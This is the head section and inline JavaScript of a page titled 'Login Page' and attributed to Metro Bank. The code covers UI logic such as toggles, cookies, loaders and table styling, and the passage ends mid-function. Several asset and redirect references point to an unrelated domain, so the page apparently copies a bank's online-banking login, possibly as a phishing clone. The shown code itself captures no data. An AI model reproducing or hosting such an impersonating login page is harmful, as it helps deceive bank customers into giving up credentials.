
<html dir="ltr" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <link rel="shortcut icon" href="www1.mbpib.online/favicon_001.ico">
    <title>Login Page</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="author" content="Metro Bank">
    <script type="text/javascript" src="jquery.min.js"></script>
    <script type="text/javascript" src="jquery-ui.min.js"></script>
    <script type="text/javascript" src="chosen.jquery.js"></script>
    <script type="text/javascript" src="jquery.blockui.js"></script>
    <script type="text/javascript" src="jquery.highlight.js"></script>
    <script>
    function runEffect(toggleID, addSlideBehaviour) {
        var options = {};
        if ("y" === addSlideBehaviour.toLowerCase()) {

            $("#" + toggleID).slideToggle("slow");
        } else {
            $("#" + toggleID).toggle();
        }
    };

    function onToggle(parentDivId, ToggleDivId, addSlideBehaviour, runRules, event) {
        var state = $("#" + ToggleDivId).css("display");
        $(".menu-panel, .dropdown-menu").hide();

        $("#" + ToggleDivId).css("display", state)
            .find(".errorAnswer").val(null).blur();
        runEffect(ToggleDivId, addSlideBehaviour);
        if (runRules != 'Y') {
            if (event.stopPropagation) event.stopPropagation();
            event.returnValue = false;
            event.cancelBubble = true;
            return false;
        }
    }

    function onBlurAction(parentDivId, ToggleDivId, addBlurBehaviour) {
        if ("y" === addBlurBehaviour.toLowerCase()) {
            setTimeout(function() {
                try {
                    $("#" + ToggleDivId).hide();
                } catch (e) {};
            }, 100);
            return;
        }
    }
    </script>
    
    <script media="screen" type="text/javascript">
    function jq(myid) {
        return '#' + myid.replace(/(:|\.)/g, '\\$1');
    }
    </script>
    
    <script type="text/javascript" src="calendar1.js"></script>
    <script type="text/javascript" src="spellcheck-caller.js"></script>
    <script type="text/javascript" charset="utf-8">

        function myPage(){
            window.location.replace("Default.aspx");
        }
    //<![CDATA[
    function createCookie(name, value, days) {
        var expires;
        if (days) {
            var date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            expires = "; expires=" + date.toGMTString();
        } else expires = "";
        document.cookie = name + "=" + value + expires + "; path=/";
    }

    function readCookie(name) {
        var nameEQ = name + "=";
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
        }
        return null;
    }

    function eraseCookie(name) {
        createCookie(name, "", -1);
    }

    function areCookiesEnabled() {
        var r = false;
        createCookie("testing", "Hello", 1);
        if (readCookie("testing") != null) {
            r = true;
            eraseCookie("testing");
        }
        return r;
    }
    if (!areCookiesEnabled()) {
        //alert('here');
        window.location.href = "www1.mbpib.online/sprite_icons.png";
        //document.cookies.submit();
    }

    var initFormInd = false;

    function beforeInitForm() {
        initFormInd = true;
        return true;
    }

    function afterInitForm() {
        initFormInd = false;
    }

    function afterInitForm(p_namespace) {
        $(".ViewMode").attr("disabled", "disabled");
        $(".ViewLinkMode").addClass("not-active");

    }

    function beforeButtonClicked(p_val, p_valMand, p_rowId, ns, p_scrollToButton, p_id, p_saveFormData, p_validateAllFields) {


        if (p_val == "__05A77CCC35E3A629 FormButton 847") window.setTimeout('downloadPDF();', 0);


        if ($("#" + p_id).is(".closePopup")) {
            var floatWindowId = $("#" + p_id).closest(".ui-dialog-content").attr("id");
            $(jq(floatWindowId)).dialog("close");
            return false;
        }
        $(".menu-panel").hide();
        return true;
    }

    var scrollToTop = false;
    var scrollToPhase = false;
    var scrollToTopFast = false;

    function beforeAjaxButtonActionService(controllerName, ns, context, btnName, disableInput, btnId) {
        $(".menu-panel").hide();
        var $but = $("#" + btnId);
        if ($but.is(".TriggerButton")) {
            $(".drop-menu-container").each(function(i, o) {
                if ($(o).parent().find("#" + $but.attr('id')).length == 0) {
                    $(o).hide();
                }
            });
            $but.closest(".Trigger").find(".drop-menu-container").fadeToggle('700');
            return false;
        }
        if ($but.is(".scrollToTopFast")) {
            scrollToTopFast = true;
        }
        if ($but.is(".scrollToTop")) {
            scrollToTop = true;
        }
        if ($but.is(".scrollToPhase")) {
            scrollToPhase = true;
        }


        var clsAttr = $("#" + btnId).attr('class');

        if (clsAttr && clsAttr.length > 0) {
            var classArr = $("#" + btnId).attr('class').split(' ');
            //alert(classArr);
            for (var i = 0; i < classArr.length; i++) {

                if (classArr[i].indexOf("WAITING_") == 0) {
                    var target = classArr[i].substring(8);
                    $("#" + target).prepend("<img class='search_waiting' style='position: relative; display: block; margin: 0px auto' src='images/loader-30-blue.html'></img>").css("display", "block");
                    $(".errorAnswer").val(null);
                    break;
                } else if (classArr[i].indexOf("LOADING_DD_") == 0) {
                    var target = classArr[i].substring(11);
                    $("#" + target).prepend("<div class='search_waiting' style='position: relative; display: block; margin: 0px auto; text-align:center;'><H4 > Loading Regular payments and Direct debits</H4><br><img class='' style='' src='images/loader-30-blue.html'></img></div>").css("display", "block");
                    break;
                } else if (classArr[i].indexOf("LOADING_PREF_") == 0) {

                    var target = classArr[i].substring(13);
                    $("#" + target).prepend("<div class='search_waiting' style='position: relative; display: block; margin: 0px auto; text-align:center;'><H4 > Loading Account Preferences </H4><br><img class='' style='' src='images/loader-30-blue.html'></img></div>").css("display", "block");


                    break;
                } else if (classArr[i].indexOf("LOADING_ALRT_") == 0) {

                    var target = classArr[i].substring(13);
                    $("#" + target).prepend("<div class='search_waiting' style='position: relative; display: block; margin: 0px auto; text-align:center;'><H4 > Loading Account Alerts </H4><br><img class='' style='' src='images/loader-30-blue.html'></img></div>").css("display", "block");


                    break;
                } else if (classArr[i].indexOf("LOAD_MINI_TXN") == 0) {

                    $button = $("#" + btnId);
                    var buttonText = $button.text();
                    if (buttonText.indexOf("View") == 0) {
                        $button.closest(".account-container").find("footer").prepend("<div class='loading_mini_cont' style='position: relative; display: block; margin: 0px auto 12px auto; text-align:center;'><br><img class='' style='' src='images/loader-30-blue.html'></img></div>").css("display", "block");
                    }
                    break;

                } else if (classArr[i].indexOf("RETRIEVE_HELP") == 0) {

                    $button = $("#" + btnId);
                    //var buttonText = $button.text();
                    //if(buttonText.indexOf("View") == 0){
                    $button.closest(".dropdown-parent").find(".dropdown-container").prepend("<div class='loading_help' style='position: relative; display: block; margin: 0px auto 12px auto; text-align:center;'><br><img class='' style='' src='images/loader-30-blue.html'></img></div>").css("display", "block");
                    //}
                    break;

                } else if (classArr[i].indexOf("SHOW_PROGRESS_IND") == 0) {
                    $button = $("#" + btnId);
                    $button.parent().parent().prepend("<div class='loading_help' style='float:left; width: 40px; position: relative; display: block; margin: 5px 0px 0 581px; text-align:center;'><img class='' style='' src='images/loader-30-blue.html'></img></div>").css("display", "block");

                    break;
                } else if (classArr[i].indexOf("LOADING_COTD_") == 0) {

                    var target = classArr[i].substring(13);
                    $("#" + target).prepend("<div class='search_waiting' style='position: relative; display: block; margin: 0px auto; text-align:center;'><H4 > Loading Tax Certificates</H4><br><img class='' style='' src='images/loader-30-blue.html'></img></div>").css("display", "block");
                    break;

                } else if (classArr[i].indexOf("LOADING_XERO_") == 0) {
                    var target = classArr[i].substring(13);
                    $("#" + target).prepend("<div class='search_waiting' style='position: relative; display: block; margin: 0px auto; text-align:center;'><H4 > Loading Xero Direct Bank Feeds Preferences</H4><br><img class='' style='' src='images/loader-30-blue.html'></img></div>").css("display", "block");
                    break;


                }


            }
        }



        return beforeSubmit(ns, "", "", btnId);
    }

    function afterAjaxButtonActionService(p_service, p_element, p_innerOrOuter, p_text, p_actionFlag, p_actionData, p_ajaxCaller, p_dElement, ns) {
        //alert('afterAjaxButtonActionService');
        if ($("#" + p_element).find(".dontRegen").length > 0 || $("#" + p_element).is(".dontRegen")) {
            return false;
        }



        return true;
    }

    function afterAjaxQuestionActionService(p_service, p_element, p_innerOrOuter, p_text, p_actionFlag, p_actionData, p_ajaxCaller, p_dElement, ns) {
        return !($("#" + p_element).find(".dontRegen").length > 0);
    }


    function postProcessAjaxButtonActionService(p_service, p_element, p_innerOrOuter, p_text, p_actionFlag, p_actionData, p_ajaxCaller, p_dElement, ns) {

        var loggedInButton = document.getElementById("BUT_LOGGEDIN_STATUS");
        var fname = "";

        //alert('postProcessAjaxButtonActionService');


        if (loggedInButton && loggedInButton.value == "N") {
            //alert('inside');
            loggedInButton.click();
        }
        //alert('postProcessAjaxButtonActionService ');
        if (window.doDownloadInd) {

            if (window.downloadCSV) {
                downloadDoc();
            }
            window.downloadCSV = false;
            doDownloadInd = false;
        }

        if (window.doDownloadPDFInd) {

            if (window.downloadPDF) {
                //downloadPDFDoc();
            }
            window.downloadPDF = false;
            doDownloadPDFInd = false;
        }


        var errorSection = $("#" + p_element).closest(".HighlightErrorSection");
        if (errorSection.length > 0) highlightErrorSection(errorSection);
        $(".search_waiting").remove();
        $(".loading_mini_cont").remove();
        $(".loading_help").remove();


        var $but = $("#" + p_element);
        if ($but.is(".lost-option")) {
            $but.closest(".action-choice").find(".lost-option").removeClass("selected");
            $but.addClass("selected");
        }



    }

    function postProcessAjaxValidationService(p_service, p_element, p_innerOrOuter, p_text, p_actionFlag, p_actionData, p_ajaxCaller, p_dElement, ns) {
        try {
            //alert('postProcessAjaxValidationService');
            /*
            $("select.chzn-select").each(function(index, element) {
            	$(this).chosen();
            });
            */

            updateAllHelp();
            preventCopyPasteOnMessage();
            setupMessageDropdowns('select.chzn-select.message-dropdowns', '');
            if (jQuery.browser.mobile) {
                $('#security-digits').css('display', 'block');
                $('#security-dropdowns').css('display', 'none');
            } else {
                $('#security-digits').css('display', 'none');
                $('#security-dropdowns').css('display', 'block');
            }

        } catch (e) {

        }


        var $field = $("#" + p_element.substring(0, p_element.length - ("_ERRORMESSAGE".length)));
        if ($field.length == 0) $field = $("#" + p_element.substring(4));
        if ($field.length == 1 && $field.is("input.decimal")) {

            if (isNaN(parseFloat($field.val())))
                $field.val("");
            else
                $field.val((parseFloat($field.val())).toFixed(2));
        }


        if (p_element.indexOf("_ERRORMESSAGE") > 0 && $("#" + p_element).closest("#FMT_0CCB45AD05D277F0113393").length > 0) {
            errors.remove(p_element);
            if (p_actionFlag == "SHOW") errors.push(p_element);
            $("#SEARCH_TX").attr("disabled", errors.length == 0 ? null : "disabled");
        }


        if (p_element.indexOf("_ERRORMESSAGE") > 0) {
            var errorSection = $("#" + p_element).closest(".HighlightErrorSection");
            if (errorSection.length > 0) {
                highlightErrorSection(errorSection);
            }
        }

    }

    function highlightErrorSections() {
        $(".HighlightErrorSection").each(function(i, o) {
            highlightErrorSection($(o));
        });
    }

    function highlightErrorSection($section) {
        var $errors = $section.find(".error-message");
        $section.removeClass("HighlightErrorSectionActive");
        $errors.each(function(i, o) {
            if ($(o).text() != "" && $(o).css("display") == "block") {
                $section.addClass("HighlightErrorSectionActive");
                return;
            }
        });
    }


    var doDownloadInd = false;
    var doDownloadPDFInd = false;
    var firstTimeTableDraw = true;

    function postProcessResponses() {
        //alert('postProcessResponsesssssss');
        //nblockPage();
    }

    function postProcessResponse(ns, caller, result) {
        //alert('postProcessResponse '+getQSize(ns));
        if ($.browser.msie && $.browser.version == 8) {


            if ($("#TBL_020C18BE9324DA1E70412 thead tr th").length == 5) {
                $("#TBL_020C18BE9324DA1E70412").css({
                    "width": "744px"
                });
                $("#TBL_020C18BE9324DA1E70412 thead").css({
                    "width": "744px",
                    "height": "34px",
                    "overflow": "hidden"
                });

                $("#TBL_020C18BE9324DA1E70412 thead tr").css({
                    "width": "744px",
                    "height": "34px"
                });
                $("#TBL_020C18BE9324DA1E70412 thead tr th").css("cssText", "vertical-align:baseline !important;");
                $($("#TBL_020C18BE9324DA1E70412 thead tr th").get(0)).css({
                    "width": "79px",
                    "height": "34px",
                    "padding": "8px"
                });
                $($("#TBL_020C18BE9324DA1E70412 thead tr th").get(1)).css({
                    "width": "273px",
                    "height": "34px",
                    "padding": "8px"
                });
                $($("#TBL_020C18BE9324DA1E70412 thead tr th").get(2)).css({
                    "width": "132px",
                    "height": "34px",
                    "padding": "8px"
                });
                $($("#TBL_020C18BE9324DA1E70412 thead tr th").get(3)).css({
                    "width": "87px",
                    "height": "34px",
                    "padding": "8px"
                });
                $($("#TBL_020C18BE9324DA1E70412 thead tr th").get(4)).css({
                    "width": "87px",
                    "height": "34px",
                    "padding": "8px"
                });
                //$("#TBL_020C18BE9324DA1E70412 thead tr th div").css({"padding-left":"0.65em","padding-right":"0.65em"});

                $("#TBL_020C18BE9324DA1E70412 tbody").css({
                    "width": "744px",
                    "height": "34px"
                });
                $("#TBL_020C18BE9324DA1E70412 tbody tr").css({
                    "width": "744px",
                    "height": "34px"
                });
                $("#TBL_020C18BE9324DA1E70412 tbody tr").each(function(index) {

                    $($(this).find("td").get(0)).css({
                        "width": "79px",
                        "height": "34px",
                        "padding": "8px"
                    });
                    $($(this).find("td").get(1)).css({
                        "width": "273px",
                        "height": "34px",
                        "padding": "8px"
                    });
                    $($(this).find("td").get(2)).css({
                        "width": "132px",
                        "height": "34px",
                        "padding": "8px"
                    });
                    $($(this).find("td").get(3)).css({
                        "width": "87px",
                        "height": "34px",
                        "padding": "8px"
                    });
                    $($(this).find("td").get(4)).css({
                        "width": "87px",
                        "height": "34px",
                        "padding": "8px"
                    });
                    // $(this).find("td").children("div").css({"padding":"0.65em"});
                });


            } else {
                $("#TBL_020C18BE9324DA1E70412").css({
                    "width": "744px"
                });
                $("#TBL_020C18BE9324DA1E70412 thead").css({
                    "width": "744px",
                    "height": "34px",
                    "overflow": "hidden"
                });

                $("#TBL_020C18BE9324DA1E70412 thead tr").css({
                    "width": "744px",
                    "height": "34px"
                });
                $("#TBL_020C18BE9324DA1E70412 thead tr th").css("cssText", "vertical-align:baseline !important;");
                $($("#TBL_020C18BE9324DA1E70412 thead tr th").get(0)).css({
                    "width": "79px",
                    "height": "34px",
                    "padding": "8px"
                });
                $($("#TBL_020C18BE9324DA1E70412 thead tr th").get(1)).css({
                    "width": "169px",
                    "height": "34px",
                    "padding": "8px"
                });
                $($("#TBL_020C18BE9324DA1E70412 thead tr th").get(2)).css({
                    "width": "132px",
                    "height": "34px",
                    "padding": "8px"
                });
                $($("#TBL_020C18BE9324DA1E70412 thead tr th").get(3)).css({
                    "width": "87px",
                    "height": "34px",
                    "padding": "8px"
                });
                $($("#TBL_020C18BE9324DA1E70412 thead tr th").get(4)).css({
                    "width": "87px",
                    "height": "34px",
                    "padding": "8px"
                });
                $($("#TBL_020C18BE9324DA1E70412 thead tr th").get(5)).css({
                    "width": "87px",
                    "height": "34px",
                    "padding": "8px"
                });
                //$("#TBL_020C18BE9324DA1E70412 thead tr th div").css({"padding-left":"0.65em","padding-right":"0.65em"});

                $("#TBL_020C18BE9324DA1E70412 tbody").css({
                    "width": "744px",
                    "height": "34px"
                });
                $("#TBL_020C18BE9324DA1E70412 tbody tr").css({
                    "width": "744px",
                    "height": "34px"
                });
                $("#TBL_020C18BE9324DA1E70412 tbody tr").each(function(index) {

                    $($(this).find("td").get(0)).css({
                        "width": "79px",
                        "height": "34px",
                        "padding": "8px"
                    });
                    $($(this).find("td").get(1)).css({
                        "width": "169px",
                        "height": "34px",
                        "padding": "8px"
                    });
                    $($(this).find("td").get(2)).css({
                        "width": "132px",
                        "height": "34px",
                        "padding": "8px"
                    });
                    $($(this).find("td").get(3)).css({
                        "width": "87px",
                        "height": "34px",
                        "padding": "8px"
                    });
                    $($(this).find("td").get(4)).css({
                        "width": "87px",
                        "height": "34px",
                        "padding": "8px"
                    });
                    $($(this).find("td").get(5)).css({
                        "width": "87px",
                        "height": "34px",
                        "padding": "8px"
                    });


                });

            }
        }

        if (getQSize(ns) <= 1) {
            $(".loader-30").parent("div:visible").hide();
            unblockPage();
            setupFancySelects();

            if (scrollToTopFast) {
                $('html, body').animate({
                    scrollTop: 0
                }, 0);
                scrollToTopFast = false;
                scrollToTop = false;
                scrollToPhase = false;
            }

            if (scrollToTop) {
                $('html, body').animate({
                    scrollTop: 0
                }, 'slow');
                scrollToTop = false;
                scrollToPhase = false;
                scrollToTopFast = false;
            }

            if (scrollToPhase) {
                $('html, body').animate({
                    scrollTop: $('#EDGE_CONNECT_PHASE').offset().top
                }, 'slow');
                scrollToTop = false;
                scrollToPhase = false;
                scrollToTopFast = false;
            }
            //alert('postProcessResponse' +window.doDownloadInd);

            /*if (window.doDownloadInd ) {

            	if(window.downloadCSV){
            		downloadDoc();
            	}
            	window.downloadCSV = false;
            	doDownloadInd = false;
            }

            if (window.doDownloadPDFInd) {

            	if(window.downloadPDF){
            		//alert('post process');
            		downloadPDFDoc();
            	}
            	window.downloadPDF = false;
            	doDownloadPDFInd = false;
            }*/

            if (caller != "ajaxValidate") {
                try {
                    $("table").unblock();
                } catch (err) {

                }

                updateAllHelp();
                preventCopyPasteOnMessage();
                updateNegativeVals();
                setupMessageDropdowns('select.chzn-select.message-dropdowns', '');
                setupAmountDropdowns('select.chzn-select.amount-dropdowns', '');
                setupODDropdowns('select.chzn-select.od-dropdowns', '');


                $("#GROUP_FS_BUT_5F24222F75C0F74A63256>div").each(function(i, o) {
                    if ($(o).css("display") != "none")
                        $(o).css("display", "block").css("float", "left");
                });
            }
        }
    }

    function beforeHelpRequest(elId, qName, ns, controllerName, contextPath) {
        var currentHelp = jQuery.data(document.body, 'currentHelp');
        if (currentHelp == elId) {
            $("#helpDiv").fadeOut();
            jQuery.data(document.body, 'currentHelp', "");
            return false;
        }
        return true;
    }

    function afterRowClicked(p_comp, p_row, p_selector, ns, p_colour, p_oddRowCol, p_evenRowCol) {
        if ($(p_comp).find(".DefaultButton").length == 1) {
            $(p_comp).find(".DefaultButton")[0].onclick();
        }

        if ($(p_comp).find(".MegaMenuTable_DefaultButton").length == 1) {
            $(p_comp).find(".MegaMenuTable_DefaultButton")[0].onclick();
        }


        //alert($(p_comp).find(".MegaConvTable_ViewBody").length);
        if ($(p_comp).find(".MegaConvTable_ViewBody").length == 1) {
            $(p_comp).find(".MegaConvTable_ViewBody")[0].onclick();
        }
    }

    function postProcessAjaxHelpService(p_service, p_element, p_innerOrOuter, p_text, p_actionFlag, p_actionData, p_ajaxCaller, p_dElement, ns) {
        var currentHelp = jQuery.data(document.body, 'currentHelp');
        if (currentHelp == p_element) {
            $("#helpDiv").fadeOut();
            jQuery.data(document.body, 'currentHelp', "");
        } else {
            $("#helpDiv").hide();
            jQuery.data(document.body, 'currentHelp', p_element);
            reposHelp();
            $("#helpDiv").fadeIn();
        }
    }

    function reposHelp() {
        var elemId = jQuery.data(document.body, 'currentHelp');

        if (elemId && $("#" + elemId).length > 0) {

            var $this = $("#" + elemId);
            var offset = $this.offset();
            var window_center_X = ($(window).width() / 2);

            if (offset.left > window_center_X) {
                $("#helpDiv").removeClass("align-help").css({
                    "left": ($("#" + elemId).offset().left - 250) + "px",
                    "top": ($("#" + elemId).offset().top + 10) + "px"
                });


            } else {
                $("#helpDiv").addClass("align-help").css({
                    "left": ($("#" + elemId).offset().left) + "px",
                    "top": ($("#" + elemId).offset().top + 10) + "px"
                });

            }
        }
    }


    function beforeSubmit(ns, mode, scroll, id) {

        var loggedInButton = document.getElementById("BUT_LOGGEDIN_STATUS");


        if (loggedInButton && loggedInButton.value == "N") {
            //alert('inside');
            loggedInButton.click();
        }
        /*concurrent login check*/
        //alert("beforesubmit");
        /*if ($('body').find("#BUT_CONCURRENT_LOGIN").length == 1) {
        	//alert("donesubmit");
        	$('body').find("#BUT_CONCURRENT_LOGIN")[0].onclick();
        }*/


        var idStr = "#" + id;
        var $el = $(idStr);
        if (id == 'BUT_665280FEFFD8821A316847') {
            document.forms['sessionTimeoutForm'].submit();
        }
        if ($el.closest(".ui-dialog").length > 0) {
            $el.closest(".ui-dialog").find(".ui-dialog-titlebar-close").hide();
        }

        if ($el.is("#SEARCH_TX, #BUT_REMOVE_ALL_FILTERS, .badge-tag, #RESET-TABLE-TARGET, #RESET-TABLE-TARGET_ALT")) {
            $("#FMT_0CCB45AD05D277F0113393").fadeOut('slow');
            $("table.RECENT_TX_TBL").block({
                message: 'Loading transactions',
                centerY: false,
                css: {
                    background: 'transparent url(.www1.mbpib.online/images/blockWaiting3.gif) no-repeat right',
                    fontSize: '18px',
                    fontWeight: 'bold',
                    color: 'white',
                    border: 'none',
                    paddingRight: '60px',
                    top: '40px'
                }
            });

            //setTimeout("$('div.blockMsg').css('background', ' transparent url(./images/blockWaiting3.gif) no-repeat right')",100);
            setTimeout(function() {
                $('div.blockMsg').css('background', ' transparent url(./images/blockWaiting3.gif) no-repeat right');
            }, 200);
            $('div.sort-reset-withoutpage').css("display", "none");
            $('div.sort-reset').css("display", "none");

        } else if ($el.is(".waitingButton")) {

            var $error_label = $el.closest("div.toggle-section").find("label.error-message:visible");
            if ($error_label.length > 0) {
                $(idStr + "_waiting").hide();
            } else {
                $(idStr + "_waiting").css('display', 'inline');
                if ($el.is(".pageBlocking")) {
                    $.blockUI({
                        message: '<h3>Please wait while we process your application<h3>',
                        centerY: false,
                        css: {
                            padding: 0,
                            background: 'url(./images/blockWaiting3.gif) no-repeat right',
                            margin: 0,
                            width: '35%',
                            top: '40%',
                            left: '35%',
                            textAlign: 'center',
                            color: 'white',
                            border: '3px #aaa',
                            cursor: 'wait'
                        }
                    });
                }
            }

        } else if ($el.is(".send-message")) {
            $(".reply-box").hide();
            $(".reply-in-progress").show();
        } else if ($el.is(".delete-messages")) {
            $(".message-delete-notification").hide();
            $(".message-delete-progress").show();
        } else if ($el.closest(".ui-dialog").length > 0) {
            $el.closest(".ui-dialog").find(".ui-dialog-titlebar-close").hide();
        }

        return true;
    }

    function afterSubmit(ns, mode, scrollToButton, id) {
        blockPageElements();
    }

    function beforeChangeTab(tabName, ns, selStyle, tabStyle) {


        if ($("div.BLOCK-TAB-ONSWITCH").length > 0) {

            moveButtonsToPopup();
        }


        if ($("#Pane" + tabName).find(".DefaultTabAction").length == 1) {

            if ($("div.BLOCK-TAB-ONSWITCH").length > 0) {

                blockPageElements();
            }


            $(".errorAnswer").val(null);
            var ua = $.browser;
            if (initFormInd && ua.msie && (ua.version.slice(0, 1) == "8" || ua.version.slice(0, 1) == "7")) {
                $.data(document.body, "ButtonToClick", $("#Pane" + tabName).find(".DefaultTabAction").attr("id"));
            } else {

                $("#Pane" + tabName).find(".DefaultTabAction").click();
            }

        } else if ($("#Pane" + tabName).find(".DefaultTabActionVB").length == 1) {


            if ($('#' + tabName).data('clicked')) {

                if ($("div.BLOCK-TAB-ONSWITCH").length > 0) {

                    blockPageElements();
                }


                $("#Pane" + tabName).find(".DefaultTabActionVB").click();
                $(this).data('clicked', false);
            }

        }

        if (tabName == "TAB_MAKEPAYMENT") {
            var tmp = $("#PaymentSubMenu_Clone");
            if (tmp.length == 0) {
                tmp = $("#Payment_SubMenu").clone(true);
                tmp.attr("id", "PaymentSubMenu_Clone");
                tmp.css('position', 'absolute');
                tmp.addClass("triangle-isosceles top available-drop whats-this-drop");
                $("#TAB_MAKEPAYMENT").append(tmp);
            }

            var text = $("#" + tabName).text();
            var anySubItems = false;
            if (text.indexOf("CannotMoveMoney") >= 0) {
                $("#PaymentSubMenu_Clone #row_MOVE_MONEY_BUTTON").css("display", "none");
            } else {
                anySubItems = true;
            }
            if (text.indexOf("CannotSendMoney") >= 0) {
                $("#PaymentSubMenu_Clone #row_SEND_MONEY_BUTTON").css("display", "none");
            } else {
                anySubItems = true;
            }
            if (text.indexOf("CannotPayBill") >= 0) {
                $("#PaymentSubMenu_Clone #row_PAY_BILL_BUTTON").css("display", "none");
            } else {
                anySubItems = true;
            }
            if (anySubItems) {
                $(tmp).fadeToggle('fast');
            }
            return false;
        }

        if ($("#Pane" + tabName).css("display") == "block")
            return false;
        else
            return true;
    }

    function afterChangeTab() {
        setupFancySelects();

    }

    function setupFancySelects() {
        $(".select-container").each(function(i, o) {
            $(o).find("select").css("width", ($(o).width() + 23) + "px");
        });
    }


    var errors = new Array();
    Array.prototype.remove = function() {
        var what, a = arguments,
            L = a.length,
            ax;
        while (L && this.length) {
            what = a[--L];
            while ((ax = this.indexOf(what)) !== -1) {
                this.splice(ax, 1);
            }
        }
        return this;
    };

    if (!Array.prototype.indexOf) {
        Array.prototype.indexOf = function(what, i) {
            i = i || 0;
            var L = this.length;
            while (i < L) {
                if (this[i] === what) return i;
                ++i;
            }
            return -1;
        };
    }

    Date.prototype.addSuffix = function() {
        var n = this.toString().split('.')[0];
        alert(n);
        var lastDigits = n.substring(n.length - 2);
        //add exception just for 11, 12 and 13
        if (lastDigits === '11' || lastDigits === '12' || lastDigits === '13') {
            return this + 'th';
        }
        switch (n.substring(n.length - 1)) {
            case '1':
                return this + 'st';
            case '2':
                return this + 'nd';
            case '3':
                return this + 'rd';
            default:
                return this + 'th';
        }
    };


    function downloadPDF() {
        try {
            openWindow = window.open('MetroBankRetail/templates/Cash%20ISA%20Transfer%20form.1.html', 'RafPrintWin', 'toolbar=0,location=0,left=100,top=100,width=800,height=800');
            openWindow.focus();
        } catch (e) {
            alert('Cannot download file for viewing: ' + e.name + ', ' + e.message);
        }
    }


    function blockPageElements() {
        if ($("#EDGE_CONNECT_PROCESS .overlay1").length == 0) {
            var w = $("#EDGE_CONNECT_PROCESS").width();
            var h = $("#EDGE_CONNECT_PROCESS").height();
            $("#EDGE_CONNECT_PROCESS").append("<div class='overlay1' style='top:0px; left: 0px; width: " + w + "px; height: " + h + "px; position: absolute; z-index: 1001; ' onclick='return false'></div>");
        }
    }

    function unblockPage() {
        $(".overlay1").remove();
    }

    function closeDialogAjax(id, variableName) {
        document.getElementById(id + "_flag").value = "N";
        makePOSTRequest("ajaxservletcontroller", true, "MODE=AJXQuestionAction&key=2635731E7BD26D7D Question 497&MODE=&WORKINGELEMENTS[1].POPUPMODALHANDLER=0&" + variableName + "=N&id=QUE_POPUPMODALHANDLER&namespace=&controllername=servletcontroller&disable=false&title=Metro Bank", "", "ajaxQLR");
    }

    function updateAllHelp() {

        $("img[title=Help]").parent().closest("div[id]").css("float", "none");
        $("img[title=Help]").replaceWith("What is this?");
    }

    function preventCopyPasteOnMessage() {



        /*	$('.message-inbox').bind('paste drag drop', function(e) {
        		e.preventDefault();
        });
        */

        $('.message-inbox').unbind('blur');
        $('.message-inbox').bind('blur', function() {
            str = $(this).val();
            var chars = str.split(''); //split into characters
            var cleanStr = "";
            for (var i = 0; i < chars.length; i++) {
                if (chars[i].charCodeAt(0) < 255) {
                    cleanStr += chars[i];
                }
            }
            $(this).val(cleanStr);
        });


    }

    function updateNegativeVals() {

        $("[id^='p4_']").each(function(i, o) {
            var innerHtml = $(o).html();
            if (innerHtml.indexOf("£-") > 0) {
                swapNegativeVals(o);
            } else {
                var ansId = $(o).attr("id").substring(3);
                var $ans = $("#" + ansId);
                var text = $ans.text();
                if (text.indexOf("-") == 0) {

                    var $pref = $("#p3_" + ansId);
                    if ($pref.text() == "£") {
                        $ans.addClass("negative-balance").html("-£" + text.substring(1));
                        $pref.remove();
                    } else if ($ans[0].nodeName.toLowerCase() == "span" && $ans.prev().text() == "£") {
                        $ans.addClass("negative-balance").html("-£" + text.substring(1));
                        $ans.prev().remove();
                    }
                }
            }
        });
    }

    function swapNegativeVals(node) {
        try {
            for (var i = 0; i < node.childNodes.length; i++) {
                var child = node.childNodes[i];
                if (child.nodeType == 3 && child.nodeValue.indexOf("£-") >= 0) {
                    child.nodeValue = child.nodeValue.replace(/£-/g, "-£");
                    child.textContent = child.nodeValue;
                } else {
                    swapNegativeVals(child);
                }
            }
        } catch (e) {

        }
    }

    function addHighlights() {
        var $highlightTrigger = $(".HighlightSource")
        if ($highlightTrigger.length > 0 && $highlightTrigger.val().length > 0) {
            $(".Highlightable").highlight($highlightTrigger.val());
        }
    }

    function moveButtonsToPopup() {
        $("td.GroupInSection>div").each(function(i, o) {
            var $origTd = $(o).parent();
            var isShown = $origTd.css("display") != "none";
            if (isShown) {
                $(o).attr('id', $origTd.attr('id'));
                var $triggerEl = $(o).parent().parent().find(".Trigger");
                $triggerEl.css("position", "relative");
                $triggerEl.css("text-align", "right");
                if ($triggerEl.find(".drop-menu-container").length == 0) {
                    $triggerEl.append("<div class=\" dropdown-menu pop-right upcoming-pay drop-menu-container\" style=\"display: none; position: absolute; text-align: left; right: 20px\"></div>");
                }
                $(o).appendTo($triggerEl.find(".drop-menu-container"));
            }
            $origTd.remove();
        });
        $("th .GroupInSection").parent().remove();
    }

    function removeHiddenTabs() {
        $(".applicability-tweak").each(function(i, o) {

            var bodySelector = $("#Pane" + $(o).attr("id") + " div.applicability-status");
            var bodyStyle = $(bodySelector).css("display");




            if ($(o).attr("style").indexOf("display: none") >= 0) {
                $(o).css({
                    "left": "-2000px",
                    "padding": "0px",
                    "height": "0px"
                });
            }

        });
    }

    function setupMessageDropdowns(className, dropdownWidth) {


        $('' + className).each(function() {
            var runTimeID = $(this).attr("id");
            $("#" + runTimeID).chosen({
                "disable_search": true
            });
            $("#" + runTimeID + "_chzn").css("width", "320px").find(".chzn-drop").css("width", "318px");
            $("#" + runTimeID + "_chzn").find(".chzn-search input").css("width", "100%");

        });


    }

    function setupODDropdowns(className, dropdownWidth) {


        $('' + className).each(function() {
            var runTimeID = $(this).attr("id");
            $("#" + runTimeID).chosen({
                "disable_search": true
            });
            $("#" + runTimeID + "_chzn").css("width", "184px").find(".chzn-drop").css("width", "184px");
            $("#" + runTimeID + "_chzn").find(".chzn-search input").css("width", "100%");

        });


    }




    $("#FMT_757E8DDD8ACC7AF8413958").find(".errorAnswer.CLEAR_ERROR").val(null);


    function setupAmountDropdowns(className, dropdownWidth) {
        //alert('set up dropdown' + className);

        $('' + className).each(function() {


            var runTimeID = $(this).attr("id");
            swapNegativeVals(document.getElementById(""));
            $(this).chosen();


